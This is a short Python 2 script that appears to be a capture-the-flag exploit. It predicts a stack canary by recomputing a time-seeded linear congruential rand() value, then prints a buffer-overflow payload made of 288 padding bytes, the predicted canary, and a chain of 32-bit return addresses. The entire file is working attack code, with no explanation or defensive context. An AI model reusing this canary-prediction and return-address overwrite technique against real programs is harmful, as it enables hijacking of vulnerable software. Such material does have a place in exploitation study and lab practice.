import time


curr_time = int(time.time())
# print(curr_time)
# print(int(0x343fd))

#curr_time = 555555

can_time = curr_time*int(0x343fd)
can_time = can_time + int(0x269ec3)

###
can_time = can_time >> int(0x10)
can_time = can_time  & int(0x7fff)

#print(can_time)
#print(hex(can_time))

hex_time = hex(can_time)


print  "a"*288 + chr(int(hex_time[4:6], 16)) + chr(int(hex_time[2:4], 16))+ chr(0x00) + chr(0x00)+ (chr(0x73)+chr(0x83)+chr(0x04)+chr(0x08))*5 + (chr(0x83)+chr(0x83)+chr(0x04)+chr(0x08)) + (chr(0x9d)+chr(0x83)+chr(0x04)+chr(0x08)) + (chr(0x6b)+chr(0x84)+chr(0x04)+chr(0x08))
